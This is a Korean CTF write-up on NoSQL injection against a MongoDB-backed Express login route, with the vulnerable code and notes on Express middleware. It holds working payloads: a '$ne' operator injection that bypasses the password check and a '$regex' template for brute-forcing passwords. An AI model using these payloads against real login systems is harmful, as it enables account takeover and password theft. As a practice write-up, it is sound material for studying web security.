---
tier: Silver 3
topics:
  - NoSQL Injection
  - MongoDB
solved-with: Self
---
### 문제 구조

로그인 요청 시 `uid`, `upw`를 받아서 MongoDB에서 일치하는 데이터를 가져와서 세션을 갱신

``` js
router.post('/', (req, res) => {
    const uid = req.body.uid;
    const upw = req.body.upw;
  
    db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            req.session.user = { uid: result['uid'], admin: result['admin']}; 
            res.redirect('/user');
        }else{
            res.redirect('/login');
        }
    });
  });
```

Form 데이터와 JSON 둘 다 처리할 수 있도록 설정
``` js
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
```

처음 서버가 시작되면 DB에 데이터가 삽입 됨. (제공된 초기 데이터와 실제 문제 서버 데이터가 다를 수도 있음.)
``` sql
use main;
db.user.insert({"uid": "guest", "upw": "guest", "admin": 0});
db.user.insert({"uid": "hack", "upw": "**sample**", "admin": 0});
db.user.insert({"uid": "apple", "upw": "**sample**", "admin": 0});
...
```


### 분석 및 풀이

로그인 요청을 JSON으로 보낼 수 있으므로 객체를 넣을 수 있고 MongoDB의 연산자 주입 공격이 가능함. 
``` json
{ 
	"uid":"admin",
	"upw": { "$ne" : null }
}
```

이걸로 모든 계정에 로그인이 가능하므로 로그인 했을때 admin 컬럼의 값이 1인 계정을 찾을 수 있음. 
해당 계정의 비밀번호를 브루트포스 공격을 통해서 얻을 수 있음. 
``` json
{
	"uid":"testuser",
	"upw": { "$regex":"^.{%s}%s.*" }
}
```

### 시행 착오

로그인 성공 시 admin 컬럼의 데이터를 얻을 수 있다는 것을 까먹고 모든 계정의 비밀번호를 얻어내서 플래그를 얻어냄. 

### 새롭게 배운 점

**Express 미들웨어**

| 미들웨어                   | 처리하는 Content-Type                 | 역할          |     |
| ---------------------- | --------------------------------- | ----------- | --- |
| `express.urlencoded()` | application/x-www-form-urlencoded | Form 데이터 파싱 |     |
| `express.json()`       | application/json                  | JSON 데이터 파싱 |     |
